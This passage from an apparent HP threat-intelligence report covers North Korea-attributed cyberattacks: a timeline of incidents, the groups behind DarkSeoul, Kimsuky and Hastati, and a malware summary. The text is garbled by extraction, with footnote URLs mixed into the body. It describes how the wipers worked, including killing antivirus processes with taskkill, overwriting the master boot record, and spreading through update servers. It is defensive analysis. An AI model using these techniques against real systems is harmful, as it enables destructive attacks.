    http://www.northkoreatech.org/2010/10/09/the-new-face-of-kcna/
2011
       
10 Days of Rain
 Attack - DarkSeoul DDoS and disk wiping malware against South Korean
           media, financial, and critical infrastructure targets (March)285 286
       North Korea disrupts South Korean GPS signals (March)287
       North Korea reportedly attempts DDoS attack against Incheon Airport 288
       Nonghyup bank suffers DDoS attack (April)289
2012
       South Korean newspaper JoongAng Ilbo attacked (June)290
       DarkSeoul Downloader.Castov detected (October)291
       North Korea signs treaty with Iran, agreeing to combat 
common enemies
           cyberspace292
2013
       
March 20
 disk wiping attacks against South Korean media and financial institutions
           (March)293
      
    Whois Team claims responsibility for attacking LG +U website with wiper malware and
           defacement, impacting South Korean media and financial institutions (March) 294 295
      
    The New Romantic Cyber Army Team claims responsibility for the same attacks296
      
    North Korea experiences 36-hour Internet outage. The cause was never definitively
           determined297
      
    Anonymous launches #OpNorthKorea and targets North Korean websites (March)298
      
    Anonymous allegedly hacks Uriminzokkiri and takes over its Twitter and Flickr pages 299
           (April)
      
    DarkSeoul attack on South Korean financial institutions (May)300
      
    DarkSeoul DDoS attacks against South Korean government
s DNS server (June)301
      
    Details on Kimsuky malware, which targeted South Korean think tanks, first released
           (September)302
2014
       North Korean drones found near South Korean border (March and April)303
    http://www.symantec.com/connect/blogs/four-years-darkseoul-cyberattacks-against-south-korea-continue-anniversary-korean-war
    https://docs.google.com/file/d/0B6CK-ZBGuMe4dGVHdTZnenJMRUk/preview?pli=1
    http://www.reuters.com/article/2011/05/03/us-korea-north-cyber-idUSTRE7421Q520110503
    http://threatpost.com/report-north-korea-accused-ddos-attack-south-korean-airport-060712/76664
    http://koreajoongangdaily.joins.com/news/article/article.aspx?aid=2965629
    http://www.theaustralian.com.au/news/latest-news/south-korean-newspaper-joongang-ilbo-hit-by-major-cyber-attack/story-fn3dxix6-
1226391202749
    http://www.symantec.com/connect/blogs/four-years-darkseoul-cyberattacks-against-south-korea-continue-anniversary-korean-war
    http://www.v3.co.uk/v3-uk/news/2202493/iran-and-north-korea-sign-technology-treaty-to-combat-hostile-malware
    http://www.symantec.com/connect/blogs/four-years-darkseoul-cyberattacks-against-south-korea-continue-anniversary-korean-war
    http://www.zdnet.com/massive-attack-on-lg-uplus-sparks-n-korea-reprisal-fears-7000012881/
    http://www.theregister.co.uk/Print/2013/03/22/sk_megahack/
    http://www.csmonitor.com/World/Security-Watch/2013/1019/In-cyberarms-race-North-Korea-emerging-as-a-power-not-a-pushover/(page)/2
    http://www.computerworld.com/s/article/9237652/North_Korea_39_s_Internet_returns_after_36_hour_outage
    http://www.northkoreatech.org/2013/03/30/tango-down-more-attacks-on-dprk-websites/
    http://www.washingtontimes.com/news/2013/apr/4/anonymous-hackers-bring-down-north-korean-websites/
    http://www.symantec.com/connect/blogs/four-years-darkseoul-cyberattacks-against-south-korea-continue-anniversary-korean-war
    http://www.symantec.com/connect/blogs/four-years-darkseoul-cyberattacks-against-south-korea-continue-anniversary-korean-war
    http://www.securelist.com/en/analysis/204792305/The_Kimsuky_Operation_A_North_Korean_APT
    http://blogs.wsj.com/korearealtime/2014/04/02/seoul-points-to-north-korea-in-crashed-drones-investigation/
Patterns in the noise: cyber incidents attributed to North Korean actors
It is interesting to note that much of North Korea
s cyber activity follows a distinct pattern.
Analysis of North Korean cyber activity gives insight into these patterns and also helps tie
together North Korea
s strategic, tactical, and operational capabilities. Strategic capabilities refer
to the assets used in support of a long-term, overarching goal. Tactical capabilities refer to the
methods and maneuvers actually implemented in pursuit of the strategic goal.304 Operational
capabilities refer to the potential use of these capabilities.305
 In 2004, in response to the annual U.S. 
 South Korea joint military exercises, North Korea
reportedly gained access to 33 South Korean military wireless communication networks.306 The
next significant cyber attack attributed to North Korea was in June 2006. The U.S. State
Department was attacked by entities in the East Asia-Pacific region. The attacks coincided with
State Department negotiations with North Korea regarding the regime
s nuclear missile tests. 307
In July 2006, North Korea
s Unit 121 reportedly breached South Korean and U.S. military
entities.308 This attack was concurrent with the regime
s test-fire of at least one long-range
missile and several medium-range missiles.309
2007 was politically tumultuous for North Korea. Following multi-national talks, the UN
International Atomic Energy Agency (IAEA) ordered the shutdown of the regime
s nuclear facilities
in Yongbyon in July.310 Its nuclear efforts temporarily thwarted, North Korea tested a logic bomb
in October 2007.311
In April 2009, North Korea ejected IAEA and U.S. nuclear compliance officials. The regime indicated
refusal to comply with any UN agreements regarding nuclear weaponry and announced it would
reinstate its nuclear materials production. The next month, North Korea conducted an
underground nuclear test and voiced its confidence that the regime was well on its way to
producing viable nuclear technology. The UN called an emergency meeting condemning the
nuclear weapons test, and South Korea joined the Proliferation Security Initiative (PSI). North
Korea issued a statement via KCNA calling South Korea
s involvement in PSI an act of war.312 In
June 2009, North Korea stated that it was 
fully ready for any form of high-tech war.
313 The
following month, DDoS and disk wiping malware, later known as DarkSeoul, targeted South
Korean and U.S. government entities, media outlets, and financial websites. The attacks coincided
    http://www.scholastic.com/teachers/article/strategy-and-tactics-military
    http://www.dau.mil/pubscats/Pages/preface.aspx
    http://www.scribd.com/doc/15078953/Cyber-Threat-Posed-by-North-Korea-and-China-to-South-Korea-and-US-Forces-Korea
    http://www.informationweek.com/state-department-releases-details-of-computer-system-attacks/d/d-id/1045112?
    http://www.scribd.com/doc/15078953/Cyber-Threat-Posed-by-North-Korea-and-China-to-South-Korea-and-US-Forces-Korea
https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=2&ved=0CCMQFjAB&url=http%3A%2F%2Fwww.bbc.com%2Fnews%2Fworld-
asia-pacific-
15278612&ei=fabyU6XQLsLFigLH94GIAw&usg=AFQjCNGbrzkNZJ5tz4jmLyMPsCHEHc41WA&sig2=l8FMAdbvzFxYeBBOAMWO6Q&bvm=bv.73231344,d
.cGE&cad=rja
    http://www.armscontrol.org/factsheets/dprkchron
    http://www.scribd.com/doc/15078953/Cyber-Threat-Posed-by-North-Korea-and-China-to-South-Korea-and-US-Forces-Korea
    http://www.armscontrol.org/factsheets/dprkchron
    http://www.huffingtonpost.com/2009/07/11/north-korea-army-lab-110-_n_229986.html
with U.S. Independence Day.314 315 Other malware used for Operation Troy was also planted.
Operation Troy would continue for several years, largely undetected.316
In early 2011, political and military tensions were high. In February, James Clapper, United States
Director of National Intelligence, testified that North Korea likely had undeclared uranium
enrichment facilities as part of its nuclear weapons program.317 In March 2011, South Korean
media, financial, and critical infrastructure targets suffered a DDoS and disk-wiping malware
attack later known as the 
10 Days of Rain
. U.S. and South Korean military entities were also
targeted by DDoS during this attack. The attack used the DarkSeoul malware.318 North Korea also
disrupted South Korean GPS signals. Additionally, North Korean actors reportedly attempted a
DDoS attack against South Korea
s Incheon Airport that same month.319 These incidents coincided
with the annual U.S. 
 South Korea joint military exercises.320 The following month, North Korean
actors reportedly launched a DDoS attack against South Korea
s Nonghyup bank.321
In 2012, an attack on South Korean Newspaper JoongAng Ilbo was attributed to North Korean
actors. This attack also coincided with the timing of the annual joint U.S. 
 South Korea military
exercises.322 In September 2012, North Korea signed a cyber treaty with Iran, agreeing the two
nations would collaborate to combat 
common enemies
 in cyberspace.323
The week of March 11, 2013, the U.S. and South Korea began their annual joint military exercise
near the Korean Peninsula. Like clockwork, attacks attributed to North Korea and now known as
the March 20 attacks targeted three South Korean media outlets and Shinhan, Nonghyup, and Jeju
banks. North Korea also exhibited other hostile activity at that time. North Korea cut
communication with Seoul and announced it had scrapped the 1953 armistice between the two
Koreas. North Korea
s foreign ministry also issued a statement that it perceived this exercise as a
precursor to invasion and that the regime would respond with a 
strong military counteraction
the situation escalated.324 That same week, the North Korean military conducted a drone attack
simulation.325
On March 18, the Uriminzokkiri YouTube channel posted an anti-U.S. video entitled 
Firestorms
Will Rain on the Headquarters of War
 that showed a depiction of the White House in crosshairs,
followed by an explosion.326
    http://www.symantec.com/connect/blogs/four-years-darkseoul-cyberattacks-against-south-korea-continue-anniversary-korean-war
    http://powerofcommunity.net/poc2009/si.pdf
    http://www.symantec.com/connect/blogs/four-years-darkseoul-cyberattacks-against-south-korea-continue-anniversary-korean-war
    http://www.armscontrol.org/factsheets/dprkchron
    http://www.symantec.com/connect/blogs/four-years-darkseoul-cyberattacks-against-south-korea-continue-anniversary-korean-war
    http://threatpost.com/report-north-korea-accused-ddos-attack-south-korean-airport-060712/76664
    http://www.reuters.com/article/2011/05/03/us-korea-north-cyber-idUSTRE7421Q520110503
    http://koreajoongangdaily.joins.com/news/article/article.aspx?aid=2965629
    http://www.theaustralian.com.au/news/latest-news/south-korean-newspaper-joongang-ilbo-hit-by-major-cyber-attack/story-fn3dxix6-
1226391202749
    http://www.v3.co.uk/v3-uk/news/2202493/iran-and-north-korea-sign-technology-treaty-to-combat-hostile-malware
    http://www.presstv.com/detail/2013/03/20/294499/north-korea-threatens-us-over-bombers/
    http://www.huffingtonpost.com/2013/03/20/north-koreas-drone_n_2914794.html
    https://www.youtube.com/watch?v=Dyap eCiOl9A
Figure 25 Uriminzokkiri YouTube video portraying anti-U.S. sentiments. 327
In May 2013, DarkSeoul malware was used to attack several South Korean financial institutions;
and in June, DarkSeoul DDoS attacks were launched against the South Korean government
s DNS
server. The latter took place on June 25, the anniversary of the start of the Korean War.328
As evidenced above, much of North Korea
s cyber activity coincides with the annual U.S. 
 South
Korea joint military exercises. Attacks not following that pattern were typically in response to
political events impacting the regime or correlated with significant dates, such as the anniversary
of the start of the Korean War. The regime
s strategic assets and tactical capabilities in the cyber
arena seem to have evolved only slightly since 2009. Most of the attacks attributed to North
Korea employ limited tactics, and their operational capability demonstrates an increase in the
frequency and volume of attacks but is otherwise unimpressive to date.
In June 2014, the regime demanded cancellation of the annual U.S. - South Korea joint military
exercise, attempting to use participation in the upcoming Asian Games as a bargaining chip.329 The
regime
s demands may have had other political motivations, as they preceded the July 2014
meeting between South Korean president Park and Chinese President Xi Jinping. The meeting
    https://www.youtube.com/watch?v=DyapeCiOl9A
    http://www.symantec.com/connect/blogs/four-years-darkseoul-cyberattacks-against-south-korea-continue-anniversary-korean-war
    http://www.theguardian.com/world/2014/jun/30/north-korea-demands-cancellation-drills
centered on trade and regional security issues, including the ever-present rhetoric around
denuclearization of North Korea.330 Both leaders were critical of Japan
s recent announcement to
soften sanctions on North Korea.331 As this report headed to press, the annual U.S. 
 South Korea
joint military exercises were underway.332
DarkSeoul
The most prominent North Korean threat actor group is the group responsible for the DarkSeoul
malware. According to statements from the South Korean government, North Korea
s Lab 110
were the actors behind the DarkSeoul malware. South Korean intelligence reports
                                                                                       According to statements
stated that Lab 110, which is affiliated with the regime
s defense ministry, was       from the South Korean
ordered by the North Korean regime to destroy South Korean communications              government, North
networks.333 Although the March 20 attacks used DarkSeoul malware, it is interesting   Korea
s Lab 110 were the
to note that two groups, WhoIs Team and New Romantic Cyber Army Team, claimed          actors behind the
                                                                                       DarkSeoul malware
responsibility for the 
March 20
 2013 attacks on South Korean media and financial
                                                                                       attacks.
institutions.334
Some of the DarkSeoul attacks corresponded with significant dates, such as U.S. Independence
Day or the anniversary of the start of the Korean War. DarkSeoul attacks go beyond denial of
service and sabotage. As early as 2009, the group responsible for the Dark Seoul attacks
launched 
Operation Troy
, an espionage campaign targeting the South Korean military. The
operation was codenamed 
Troy
 due to the frequent use of the word 
Troy
 in the malware
compile path strings.335 The malware used in these attacks sought out and exfiltrated data, based
on keyword searches. While the malware was clearly intended to search for and exfiltrate certain
types of data, its true impact on the targets was never revealed. 336 The March 2011 
10 Days of
Rain
 DDoS attacks on U.S. and South Korean sites have also been attributed to the actors
associated with DarkSeoul.337 According to Symantec, the politically motivated attacks have
required a level of intelligence, coordination, monetary support, and technical sophistication that
suggests state sponsorship.338 This designation means the group can be considered an advanced
persistent threat (APT).
A March 20, 2013 attack attributed to the DarkSeoul actors targeted three South Korean media
outlets and Shinhan, Nonghyup, and Jeju banks. The impact of the March 20 attacks included
disruption of service at financial institutions and data deletion. However, the targeted entities
resumed normal operations shortly thereafter.339 According to South Korean reports, the media
outlets targeted corresponded with those listed by the North Korean regime in 2012 as right-wing
press that manipulated South Korea
s public opinion. In April 2012, the regime reportedly listed
    http://edition.cnn.com/2014/07/02/world/asia/south-korea-xi-visit/index.html?hpt=hp_bn7
    http://mobile.nytimes.com/blogs/sinosphere/2014/07/07/q-and-a-john-delury-on-chinese-south-korean-ties/?smid=tw-share
    http://www.globalpost.com/dispatch/news/yonhap-news-agency/140825/n-korea-urges-un-action-against-s-korea-us-military-drill
    http://www.theguardian.com/world/2009/jul/11/south-korea-blames-north-korea-cyber-attacks
    http://www.csmonitor.com/World/Security-Watch/2013/1019/In-cyberarms-race-North-Korea-emerging-as-a-power-not-a-pushover/(page)/2
    http://www.darkreading.com/attacks-and-breaches/south-korean-bank-hackers-target-us-military-secrets/d/d-id/1110674?
    http://motherboard.vice.com/blog/the-dark-seoul-hackers-were-after-south-korean-military-secrets
    http://blogs.mcafee.com/wp-content/uploads/2011/07/McAfee-Labs-10-Days-of-Rain-July-2011.pdf
    http://www.symantec.com/connect/blogs/four-years-darkseoul-cyberattacks-against-south-korea-continue-anniversary-korean-war
    http://www.nytimes.com/2013/03/21/world/asia/south-korea-computer-network-crashes.html?pagewanted=all&_r=1&
those entities as attack targets.340 The malware used in the March 20, 2013 attacks were wiper
malware. The malware attempted to disable AhnLab and Hauri AV antivirus products then
proceeded to overwrite the master boot record (MBR). The attack was capable of wiping both
Linux and Windows machines.341 McAfee found that these attacks were the culmination of the
malware campaign they dubbed 
Operation Troy
.342
A report from IssueMakersLab tied the actors responsible for the March 20, 2013 attacks to cyber
attack activity occurring as early as 2007. IssueMakersLab found that these actors consistently
used the same 16-digit password for file compression, the same stage 1 C2 protocol, the same
collection keywords and encryption keys, and the same development path.343 According to South
Korea
s Korea Internet and Security Agency, the North Korean IP address 175.45.178.xx was
found scanning South Korean routes the month before the attacks,344 and the same IP was
reportedly logged as accessing one of the targets 13 times.345 Details of the March 20 attack also
suggested possible ties to China. AlienVault suspected the Chinese exploit kit GonDad was used to
spread the malware, and the Korean domains serving the malware were registered using a
Chinese email address. Additionally, researchers at AhnLab in South Korea noted a Chinese IP
address linked to the attacks.346
While no concrete evidence has been released that indicates Lab 110 was responsible for the
DarkSeoul attacks, the responsible group
s targets, TTP, and attack timing demonstrate a strong
pro-North Korean sentiment.
Known tactics, techniques and procedures
 Customized wiper malware347
 DDoS
 Multi-staged, coordinated attacks348
 Destructive payloads with politically significant trigger dates
 Use of politically themed strings when overwriting disk sectors
 Utilizing legitimate patching mechanisms to spread malware across corporate networks
 Encryption and obfuscation methods that have become their signature
 Repeated use of a specific webmail server
 Consistent C2 structures
 Antivirus disablement and evasion349
 Watering hole attacks
 Zero-days
 Spearphishing350
    http://english.yonhapnews.co.kr/northkorea/2013/03/21/71/0401000000AEN20130321006700315F.HTML
    http://www.theregister.co.uk/Print/2013/03/22/sk_megahack/
    http://www.darkreading.com/attacks-and-breaches/south-korean-bank-hackers-target-us-military-secrets/d/d-id/1110674?
    https://docs.google.com/file/d/0B6CK-ZBGuMe4dGVHdTZnenJMRUk/preview?pli=1
    http://english.yonhapnews.co.kr/national/2013/04/11/79/0301000000AEN20130411008351320F.HTML
    http://www.darkreading.com/attacks-and-breaches/how-south-korea-traced-hacker-to-pyongyang/d/d-id/1109491?
    http://www.theregister.co.uk/Print/2013/03/22/sk_megahack/
    http://news.sky.com/story/1108704/darkseoul-gang-behind-years-of-korea-hacking
    http://www.symantec.com/connect/blogs/four-years-darkseoul-cyberattacks-against-south-korea-continue-anniversary-korean-war
    http://www.theregister.co.uk/Print/2013/03/22/sk_megahack/
    http://www.infoworld.com/t/data-security/mcafee-uncovers-massive-cyber-espionage-campaign-against-south-korea-222245
Targets
      
    South Korean military
      
    U.S. sites
      
    Shinhan Bank
      
    Nonghyup Bank351
      
    Jeju Bank352
      
    Munhwa Broadcasting Corp.
      
    YTN
      
    Korea Broadcasting System353
      
    South Korean government DNS server
      
    South Korea financial institutions
WhoIs Team
WhoIs Team is one of two groups that claimed responsibility for the 
March 20
 attacks targeting
South Korea. A defacement on the LG +U webpage stated that it was 
Hacked by WhoIs Team
and that the attackers would return. The page featured three skulls.354 However, no other attacks
by WhoIs Team have been observed.
    http://www.reuters.com/article/2011/05/03/us-korea-north-cyber-idUSTRE7421Q520110503
    http://www.nytimes.com/2013/03/21/world/asia/south-korea-computer-network-crashes.html?pagewanted=all&_r=1&
    http://www.businessweek.com/news/2013-03-20/s-dot-korea-hit-by-cyber-attack-roiling-banks-to-broadcasters
    http://www.zdnet.com/massive-attack-on-lg-uplus-sparks-n-korea-reprisal-fears-7000012881/
Figure 26 A defacement by 
WhoIs Team
 355
Known tactics, techniques, and procedures
 Wiper malware356
 Defacements
Targets
         
    Took credit for an attack on the LG +U website.
      http://nakedsecurity.sophos.com/2013/03/20/south-korea-cyber-attack/
      http://www.mcafee.com/sg/resources/white-papers/wp-dissecting-operation-troy.pdf
Associated actors
 dbM4st3r
 d3sign3r
 APTM4st3r
 s3ll3r
 vacc1nm45t3r
 r3cycl3r
Based on North Korea
s affinity for disinformation and counterintelligence, we must note the
distinct possibility that operatives claiming to be WhoIs Team are part of another group and that
the defacement was a false flag operation meant to pin blame on RAON_ASRT. RAON_ASRT is a
South Korean white hat capture the flag (CTF) team, whose members also operate under the
name 
WhoIs
.357
Figure 27 A screenshot showing that South Korea
s RAON_ASRT white hat CTF team also uses the
moniker WhoIs.358
RAON_ASRT (the RaonSecure Advanced Security Research Team) and its sub-teams WhoIs Team
and Cpark Team359 have participated in and performed well in CTF contests such as the one
hosted by DefCon. 360 In 2013, a member of RAON_ASRT was invited to Blue House, the residence
of the South Korean president, to meet with president Park and discuss the security industry.361
RAON_ASRT runs the Secuinside CTF competition.362 Their parent organization RaonSecure
operates a whitehat training program.363 The group also runs the Korea WhiteHat Contest, which
is hosted by South Korea
s Ministry of National Defense and National Intelligence Service and
    https://ctftime.org/team/3206
    https://ctftime.org/team/3206
    http://ls-al.org/asrt-has-become-the-winner-of-codegate-2013/
    http://blog.raonsecure.com/62
    http://ls-al.org/asrt-researcher-meets-the-president-park-in-korea/
    http://ls-al.org/asrt-runs-secuinside-ctf/
    http://www.whitehat.co.kr/
supervised by South Korean Cyber Command.364 For these reasons, it seems unlikely that the
RAON_ASRT WhoIs Team would maliciously target South Korean entities.
IsOne
IsOne is the group that claimed responsibility for the June 2012 attack on the website of South
Korean newspaper JoongAng Ilbo. The attack included an attempt to wipe JoongAng Ilbo
s servers
as well as a defacement depicting a laughing cat. Despite efforts to wipe the target
s servers, the
target only suffered defacement and temporary downtime.365
Figure 28 Defacement by 
IsOne
. 366
Although the groups have a similar name and both use a cat theme, it is unclear whether a CTF
team known as 
The Cat is Number 1
 and IsOne are the same actors. 
The Cat is Number 1
members claim to hail from North Korea, but there is no hard evidence linking team members to
    http://ls-al.org/%EB%8C%80%ED%95%9C%EB%AF%BC%EA%B5%AD-%ED%99%94%EC%9D%B4%ED%8A%B8%ED%96%87-
%EC%BD%98%ED%85%8C%EC%8A%A4%ED%8A%B8korea-whitehat-contest-%EA%B0%9C%EC%B5%9C/
    http://koreajoongangdaily.joins.com/news/article/article.aspx?aid=2965629
    http://bad-bytes.blogspot.co.uk/2012/06/joongang-ilbo-cyber-attack.html
the region.367 Again, it seems that the actors responsible for the attack borrowed the moniker of
another group.
Figure 29 A screenshot of 
The Cat is Number One
 profile on CTF Time 368
According to South Korea
s National Police Agency, the attack on JoongAng Ilbo shares
characteristics with previous attacks attributed to North Korean actors. An investigation
conducted by the agency
s Cyber Terror Response Center found that the actors targeting
JoongAng Ilbo used two North Korean servers and 17 servers in 10 other countries. One server
maintained a constant connection to an IP address belonging to Joson Telecommunication
Company, which is affiliated with North Korea
s Ministry of Posts and Telecommunications.
Investigators found that one of the servers used in the attack on JoongAng Ilbo was also used in
the March 2011 DDoS attacks on South Korean critical infrastructure sites and the April 2011
attack on Nyongyup Bank.369
Known tactics, techniques and procedures
 Wiper malware
 Defacements
Targets
      
     Took credit for defacing JoongAng Ilbo.
    https://ctftime.org/team/2538
    https://ctftime.org/team/2538
    http://koreajoongangdaily.joins.com/news/article/article.aspx?aid=2965629
Kimsukyang
The Kimsuky malware, which targeted South Korean think tanks, is loosely attributed to an actor
referred to as Kimsukyang. Little is known about the actor or group responsible for the malware.
However, the following email addresses are associated with the Kimsuky operation:370
      
    beautifl@mail.bg
      
    ennemyman@mail.bg
      
    fasionman@mail.bg
      
    happylove@mail.bg
      
    lovest000@mail.bg
      
    monneyman@mail.bg
      
    sportsman@mail.bg
      
    veryhappy@mail.bg
      
    iop110112@hotmail.com
      
    rsh1213@hotmail.com
The email address iop110112@hotmail.com was registered using the alias 
kimsukyang
, and
rsh1213@hotmail.com was registered using the alias 
Kim asdfa
Kaspersky found that the Kimsuky operation used 10 IP addresses in two Chinese provinces that
border North Korea: Jilin and Liaoning.371
Known tactics, techniques and procedures
 Malware with keylogger and data exfiltration capabilities
 Malware disables AhnLab security software372
Targets
      
    Sejong Institute
      
    Korea Institute for Defense Analyses (KIDA)
      
    Ministry of Unification
      
    Hyundai Merchant Marine
      
    The Supporters of Korean Unification373
New Romantic Cyber Army Team / Hastati
The New Romantic Cyber Army Team also took credit for the March 20, 2013 attacks. McAfee
suspected New Romantic Cyber Army Team were responsible for Operation Troy and the resulting
March 20, 2013 attacks due to the group
frequent use of Roman and classical terms in their
    http://www.securelist.com/en/analysis/204792305/The_Kimsuky_Operation_A_North_Korean_APT
    http://www.csmonitor.com/World/Security-Watch/2013/1019/In-cyberarms-race-North-Korea-emerging-as-a-power-not-a-pushover/(page)/5
    http://www.securelist.com/en/analysis/204792305/The_Kimsuky_Operation_A_North_Korean_APT
    http://www.securelist.com/en/analysis/204792305/The_Kimsuky_Operation_A_North_Korean_APT
code.
374 It is unknown whether Hastati is an alternate name for the group or whether Hastati is
an individual actor within the group.
It is interesting to note that the malware associated with these actors uses the strings 
HASTATI
and 
PRINCIPES
 to overwrite the MBR. The name Hastati likely refers to a class of infantrymen of
the early Roman Republic. The Hastati were less experienced soldiers who fought on the
frontlines with spears and swords. Principes likely refers to more experienced Roman soldiers
who fought on the second line of battle. 375
Figure 30 Defacement by Hastati.376
Known tactics, techniques and procedures
 Wiper malware
Targets
      
    KBS TV377
      
    Entities targeted in Operation Troy378
Malware summary
HP researchers had previously analyzed samples of the DarkSeoul dropper, and findings were
published in our annual HP Cyber Risk Report 2013. Analysis of this malware is included in
Appendix C. Analysis of additional malware used in these campaigns produced no new findings
and only corroborated what was found by external security researchers. These publicly available
analyses have been cited throughout the report. Some of the malware samples were no longer
publicly available. However, CrowdStrike obtained these missing samples before they
disappeared from the wild and conducted thorough analysis, which was released in their
subscription-only reports. While we cannot divulge detailed information from those reports, an
overview of the findings is provided below.
    http://www.darkreading.com/attacks-and-breaches/south-korean-bank-hackers-target-us-military-secrets/d/d-id/1110674?
    http://www.roman-empire.net/army/army.html#earlylegion
    http://eromang.zataz.com/2013/04/02/dark-south-korea-total-war-review/
    http://eromang.zataz.com/2013/04/02/dark-south-korea-total-war-review/
    http://www.mcafee.com/us/resources/white-papers/wp-dissecting-operation-troy.pdf
The majority of the malware used in cyber incidents attributed to North Korea were variations of
three types of malware: dropper, wiper, and IRC remote access trojan (RAT). CrowdStrike
attribution of this malware to North Korean actors stemmed from two primary factors: Korean
language characters found in the binaries and the propensity to specifically target South Korean
entities.379
Dropper samples consistently targeted AhnLab Policy Center as a propagation method. This
information is corroborated in a Black Hat Asia 2014 presentation by Fortinet researcher Kyle
Yang.380 CrowdStrike
s report also briefly noted the use of an update server vector.381 Yang
analyzed the malware's update config metadata and matched its format to the AhnLab Policy
Center. To test its payload, Yang set up a server/client and executed the update through the
server. As Yang had predicted, it wiped the client.382 While the method for initial compromise of
the update server is not noted in detail, CrowdStrike
s report cites 
collateral information
 that
suggests targeted email attacks were used to gain initial entry, and policy servers were then
compromised. The upload server vector included a time-based logic bomb that allowed the wiper
to target a large number of systems, on a set time and date, with full permissions on all of the
targeted systems.383
According to CrowdStrike, the wiper malware was dropped on the systems as AgentBase.exe. The
wiper used the Windows utility 'taskkill' to kill the processes pasvc.exe and clisvc.exe, which are
the main processes for the Ahnlab and Hauri antivirus applications.384 385 The wiper then
performed system reconnaissance, gathering drive information and operating system version.
Depending on the OS used, the wiper recursively deleted files on the file system, deleting the
Windows folder last. It then overwrote the MBR with the strings "HASTATI", "PRINCPES",
"PRINCIPES", or "PR!NCPES
.386
While there are several variants of the wiper, all seem to have been used on the same date. It is
unclear why multiple wiper variants with slightly differing behavior were used for the same
campaign. One possible explanation is that multiple variants were used to minimize the
operational damage to the mission in the case of an early detection of one of the variants. For
example, if one wiper variant was compromised or detected by antivirus or IDS signatures, the
other variants may have differed enough to remain undetected, still resulting in mission success.
According to CrowdStrike, a third malware component downloaded an IRC RAT from various
compromised websites. This RAT is detected by Symantec as Backdoor.Prioxer. Prioxer has been
linked to other 2011 attacks on South Korea. It is unclear whether these downloaders were
    CrowdStrike Intelligence Report CSIR-13013
    Yang, Kyle. Z:\Make Troy\, Not War: Case Study of the Wiper APT in Korea, and Beyond. Black Hat Asia, March 2014.
    CrowdStrike Intelligence Report CSIR-13013
    Yang, Kyle. Z:\Make Troy\, Not War: Case Study of the Wiper APT in Korea, and Beyond. Black Hat Asia, March 2014.
    CrowdStrike Intelligence Report CSIR-13013
    CrowdStrike Intelligence Report CSIR-13030
    Yang, Kyle. Z:\Make Troy\, Not War: Case Study of the Wiper APT in Korea, and Beyond. Black Hat Asia, March 2014.
    CrowdStrike Intelligence Report CSIR-13030
pushed out in the same update server vector as the wipers. However, the two malware types both
use the same packer 'Jokra' and both contain the strings 
HASTATI" and "PRINCPES
.387
Analysis
Based on the information above, we have identified strategic challenges that impact the
development of North Korea
s cyber warfare capabilities. We have also noted relevant
implications:
      
    The North Korean regime strictly controls all Internet infrastructure,388 meaning cyber
           activity by dissidents or autonomous hacker groups are very unlikely. In other words, any
           cyber attacks originating in North Korea can be assumed to be state sponsored. For this
           reason, according to defectors, the regime
s cyber operators do not typically launch
           attacks directly from within North Korea. Instead, many regime-sponsored attacks are
           launched from cells based in China, U.S., South Asia, Europe, and even South Korea.389
      
    North Korea has a limited number of outgoing connections.390 For this reason, there is a
           low probability of DDoS originating from within. However, this does not preclude the use
           of botnets with a local C2 server or the use of networks in third-party nations to launch
           attacks. As seen in the July 2009 attacks on South Korean and U.S. targets, North Korea
           has leveraged networks in countries such as Austria, Georgia, Germany, and even South
           Korea and the U.S., in order to launch cyber attacks.391 North Korea will likely be forced to
           rely on third parties for quite some time, due to its lack of sufficient infrastructure for
           launching large-scale CNO.
      
    Several outward facing websites are hosted in China and other countries. This implies two
           possibilities: that North Korea
s infrastructure cannot handle a heavy incoming traffic load
           392
               or that the regime wants to separate the propaganda crafted for an outside target
           audience from internally-focused propaganda. This arrangement seems unlikely to
           change in the foreseeable future.
      
    North Korea is known to have unstable power supplies393, which limits scalability of the
           regime
s current CNO capabilities. This is another reason why expansion of CNO
           capabilities using the nation
s own infrastructure seems unlikely in the foreseeable future.
      
    North Korea is known to have monetary deficiencies,394 which further limit expansion of
           infrastructure and CNO capabilities, at least without third-party aid. North Korea continues
           to rely heavily on China for sustainment.395
      
    Although we see few instances of overt cyber operations, that North Korea reportedly
           spends so much of its limited resources on training and equipping cyber operators speaks
           volumes. The human element of the regime
s cyber war program, at least, has potential.
    CrowdStrike Intelligence Report CSIR-13013
    http://www.defense.gov/pubs/North_Korea_Military_Power_Report_2013-2014.pdf
    http://www.csmonitor.com/World/Security-Watch/2013/1019/In-cyberarms-race-North-Korea-emerging-as-a-power-not-a-pushover/(page)/5
    http://www.defense.gov/pubs/North_Korea_Military_Power_Report_2013-2014.pdf
    http://www.theguardian.com/world/2009/jul/11/south-korea-blames-north-korea-cyber-attacks
    http://binarycore.org/2012/05/30/investigating-north-koreas-netblock-part-3-topology/
    http://38north.org/2010/09/speak-loudly-and-carry-a-small-stick-the-north-korean-cyber-menace/
    http://www.defense.gov/pubs/North_Korea_Military_Power_Report_2013-2014.pdf
    http://docs.house.gov/meetings/AS/AS00/20140402/101985/HHRG-113-AS00-Wstate-ScaparrottiUSAC-20140402.pdf
        
     Sanctions against North Korea and export laws prohibit the sale of certain technologies to
              the regime.396 In other words, in order to obtain the technology needed for a cyber
              warfare program, the regime must improvise. North Korea must develop its own
              technology, manufacture technology using plans obtained via industrial espionage, or rely
              on third parties to procure it for them. However, the regime has historically failed in its
              attempts of large-scale production of electronic components. At present, North Korea
              relies on China to provide much of its network hardware, including servers and routers.397
              It is unlikely that North Korea will compromise on its nuclear program, meaning sanctions
              will likely be longstanding, and the regime will have to continue to rely on third parties to
              procure technology.
Cyber incidents attributed to North Korean actors seem to follow distinct patterns:
        
     According to reports by other researchers, the conventions and C2 structure used by
              North Korean cyber actors show continuity and consistency over time.
        
     The majority of the incidents attributed to North Korean actors consistently used wiper
              malware.
        
     Several of the incidents included defacements, with a different group taking credit each
              time. Additionally, little information or attack history was found about any of the groups,
              aside from information acknowledged in this report. These factors seem to indicate that a
              single group may have been responsible for several attacks over time, using different
              group names as a false flag.
        
     On more than one occasion, the malware included provisions to disable security software
              made by South Korean security company AhnLab. This detail strengthens the case that
              the malware was written or modified to specifically target South Korean machines.
        
     The attacks followed an explicit pattern: most were around the time of U.S. 
 South
              Korean joint military exercises, while the others fell on a significant date or were in
              response to political events.
        
     The primary targets were South Korean and U.S. entities. While these nations are
              traditionally targeted by the regime, it is also possible that South Korean entities are quick
              to attribute any attack on their infrastructure to North Korean actors. In fact, in some
              cases, South Korean reports were the only source of attribution.
Summary
Does North Korea have sufficient cyber infrastructure and cyber warfare capabilities to harm the
U.S. and its allies? While North Korea
s cyber warfare capabilities pale in comparison to those of
